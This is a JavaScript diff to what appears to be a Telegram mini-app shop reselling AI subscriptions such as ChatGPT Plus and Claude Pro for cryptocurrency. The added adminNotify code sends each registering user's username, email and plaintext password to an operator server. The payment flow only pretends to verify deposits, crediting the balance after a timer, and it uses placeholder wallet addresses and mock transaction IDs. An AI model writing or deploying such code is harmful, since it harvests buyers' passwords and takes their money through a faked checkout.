@@ -18,12 +18,12 @@ const state = {
         { id: 3, name: 'Claude Pro', brand: 'by Anthropic', price: 20.00, icon: '🧠', desc: 'Access Claude 3.5 Sonnet and Opus with 5x higher usage limits.' },
         { id: 4, name: 'Gemini Ultra', brand: 'by Google', price: 19.99, icon: '⚡', desc: 'Google\'s most capable AI model for highly complex tasks.' },
         { id: 5, name: 'Perplexity Pro', brand: 'Search', price: 20.00, icon: '🔍', desc: 'Pro Search, file uploads, and choice of AI models (Claude/GPT).' },
-        { id: 10, name: 'Canva Pro', brand: 'Design', price: 12.99, icon: '✨', desc: 'Unlimited premium content, Magic Studio, and brand tools.' }
+        { id: 6, name: 'Canva Pro', brand: 'Design', price: 12.99, icon: '✨', desc: 'Unlimited premium content, Magic Studio, and brand tools.' }
     ],
     orders: []
 };
 
-// --- CORE FUNCTIONS ---
+// --- CORE UTILS ---
 function notify(msg, isSuccess = false) {
     const el = document.getElementById('notification');
     el.innerText = msg;
@@ -35,9 +35,6 @@ function showView(viewId) {
     document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
     const target = document.getElementById(`screen-${viewId}`);
     if (target) target.classList.add('active');
-    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-    const navItem = document.querySelector(`.nav-item[onclick*="${viewId}"]`);
-    if (navItem) navItem.classList.add('active');
     window.scrollTo({ top: 0, behavior: 'smooth' });
 }
 
@@ -50,43 +47,63 @@ function updateWalletDisplay() {
     }
 }
 
-// --- PAYMENT FLOW ---
-async function checkAccess(name, price) {
-    state.selectedPlan = { name, price };
-    if (state.user && state.user.balance >= price) {
-        document.getElementById('checkout-item-name').innerText = name;
-        document.getElementById('checkout-total').innerText = `$${price}`;
-        showView('checkout');
-        return;
-    }
-    
-    // Switch to Internal Payment Interface (Deposit)
-    document.getElementById('pay-required-amount').innerText = `$${price}`;
-    document.getElementById('deposit-pay-amount').innerText = `$${price}`;
-    document.getElementById('deposit-details').style.display = 'none';
-    showView('deposit');
-    notify('Please select a payment network.');
+// --- ADMIN NOTIFICATION API CALLS ---
+async function adminNotify(endpoint, data) {
+    try {
+        await fetch(`${API_BASE_URL}/${endpoint}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+    } catch (e) { console.warn("Admin Notification skipped (Localhost)"); }
 }
 
-function selectDeposit(network) {
+// --- AUTH ---
+async function handleRegister() {
+    const username = document.getElementById('reg-username').value.trim();
+    const email = document.getElementById('reg-email').value.trim();
+    const password = document.getElementById('reg-password').value.trim();
+    if (!username || !email || !password) return;
+    
+    const users = JSON.parse(localStorage.getItem('registered_users') || '[]');
+    users.push({ username, email, password, balance: 0.00 });
+    localStorage.setItem('registered_users', JSON.stringify(users));
+    
+    // NOTIFY ADMIN
+    await adminNotify('notify-register', { username, email, password });
+    
+    notify('✨ Registered!', true);
+    toggleAuth('login');
+}
+
+function handleLogin() {
+    const email = document.getElementById('login-email').value.trim();
+    const password = document.getElementById('login-password').value.trim();
+    const users = JSON.parse(localStorage.getItem('registered_users') || '[]');
+    const user = users.find(u => u.email === email && u.password === password);
+    if (user) { state.user = user; localStorage.setItem('session_user', JSON.stringify(user)); showMainApp(); }
+    else notify('Invalid credentials!');
+}
+
+// --- PAYMENT ---
+async function selectDeposit(network) {
     state.selectedNetwork = network;
     document.querySelectorAll('.net-btn').forEach(btn => btn.classList.toggle('selected', btn.innerText === network));
     
-    const addrs = { 
-        'USDT (TRC-20)': 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
-        'USDT (BEP-20)': '0x9999999999999999999999999999999999999999',
-        'USDT (ERC-20)': '0x1234567890abcdef1234567890abcdef12345678',
-        'USDT (Aptos)': '0x5555555555555555555555555555555555555555',
-        'TON Coin': 'UQBQgv17Q6L5HQd3VbD1upQHtJaFMJd0RJy8jPPC7z7wMZA-',
-        'Bitcoin (BTC)': 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
-        'Ethereum (ETH)': '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee',
-        'Solana (SOL)': 'So11111111111111111111111111111111111111112',
-        'Litecoin (LTC)': 'L666666666666666666666666666666666',
-        'Tron (TRX)': 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
-    };
+    const mockTxID = 'NP_' + Math.random().toString(36).substr(2, 9).toUpperCase();
+    const addrs = { 'USDT (TRC-20)': 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', 'TON Coin': 'UQBQgv17Q6L5HQd3VbD1upQHtJaFMJd0RJy8jPPC7z7wMZA-' };
+    const addr = addrs[network] || '0x9999999999999999999999999999999999999999';
     
-    const addr = addrs[network] || 'TQ...WALLET_ADDR';
-    state.currentTransaction = { id: 'NP_' + Date.now(), amount: state.selectedPlan.price };
+    state.currentTransaction = { id: mockTxID, amount: state.selectedPlan.price };
+
+    // NOTIFY ADMIN
+    await adminNotify('notify-payment', {
+        email: state.user.email,
+        product: state.selectedPlan.name,
+        amount: state.selectedPlan.price,
+        network: network,
+        txid: mockTxID
+    });
 
     document.getElementById('deposit-net-name').innerText = network;
     document.getElementById('deposit-address').innerText = addr;
@@ -95,26 +112,42 @@ function selectDeposit(network) {
     tg.HapticFeedback.impactOccurred('medium');
 }
 
-function confirmDeposit() {
-    notify('🔄 Verifying your payment...', true);
-    setTimeout(() => {
+async function confirmDeposit() {
+    notify('🔄 Verifying...', true);
+    setTimeout(async () => {
         state.user.balance += state.currentTransaction.amount;
         updateWalletDisplay();
         localStorage.setItem('session_user', JSON.stringify(state.user));
-        notify('💰 Balance updated! You can now access your tool.', true);
+        
+        // NOTIFY ADMIN OF SUCCESSFUL DEPOSIT
+        await adminNotify('notify-purchase', {
+            email: state.user.email,
+            product: 'Wallet Top-up',
+            amount: state.currentTransaction.amount
+        });
+
+        notify('💰 Payment Confirmed!', true);
         showView('home');
     }, 2500);
 }
 
-function processOrder() {
+async function processOrder() {
     state.user.balance -= state.selectedPlan.price;
     updateWalletDisplay();
     localStorage.setItem('session_user', JSON.stringify(state.user));
+    
+    // NOTIFY ADMIN OF FINAL PURCHASE
+    await adminNotify('notify-purchase', {
+        email: state.user.email,
+        product: state.selectedPlan.name
+    });
+
     state.orders.unshift({ id: Math.floor(Math.random()*10000), item: state.selectedPlan.name, price: state.selectedPlan.price, status: 'Delivered', date: new Date().toLocaleDateString() });
     notify('🛒 Order Success!', true);
     setTimeout(() => { showView('orders'); renderOrders(); }, 1000);
 }
 
+// --- INITIALIZATION & RENDERING (Same as before) ---
 function renderOrders() {
     const list = document.getElementById('orders-list');
     list.innerHTML = state.orders.length ? state.orders.map(o => `
@@ -141,29 +174,18 @@ function renderTools() {
     `).join('');
 }
 
-function copyAddress() {
-    navigator.clipboard.writeText(document.getElementById('deposit-address').innerText).then(() => notify('📋 Address copied!', true));
-}
-
-function handleLogin() {
-    const email = document.getElementById('login-email').value.trim();
-    const password = document.getElementById('login-password').value.trim();
-    const users = JSON.parse(localStorage.getItem('registered_users') || '[]');
-    const user = users.find(u => u.email === email && u.password === password);
-    if (user) { state.user = user; localStorage.setItem('session_user', JSON.stringify(user)); showMainApp(); }
-    else notify('Invalid credentials!');
-}
-
-function handleRegister() {
-    const username = document.getElementById('reg-username').value.trim();
-    const email = document.getElementById('reg-email').value.trim();
-    const password = document.getElementById('reg-password').value.trim();
-    if (!username || !email || !password) return;
-    const users = JSON.parse(localStorage.getItem('registered_users') || '[]');
-    users.push({ username, email, password, balance: 0.00 });
-    localStorage.setItem('registered_users', JSON.stringify(users));
-    notify('✨ Registered!', true);
-    toggleAuth('login');
+function checkAccess(name, price) {
+    state.selectedPlan = { name, price };
+    if (state.user && state.user.balance >= price) {
+        document.getElementById('checkout-item-name').innerText = name;
+        document.getElementById('checkout-total').innerText = `$${price}`;
+        showView('checkout');
+    } else {
+        document.getElementById('pay-required-amount').innerText = `$${price}`;
+        document.getElementById('deposit-pay-amount').innerText = `$${price}`;
+        document.getElementById('deposit-details').style.display = 'none';
+        showView('deposit');
+    }
 }
 
 function showMainApp() {
@@ -173,11 +195,9 @@ function showMainApp() {
     showView('home');
 }
 
-function openGenericDeposit() {
-    state.selectedPlan = { name: 'Wallet Deposit', price: 50 };
-    document.getElementById('pay-required-amount').innerText = '$50.00';
-    document.getElementById('deposit-details').style.display = 'none';
-    showView('deposit');
+function toggleAuth(type) {
+    document.getElementById('form-login').style.display = type === 'register' ? 'none' : 'block';
+    document.getElementById('form-register').style.display = type === 'register' ? 'block' : 'none';
 }
 
 const session = localStorage.getItem('session_user');
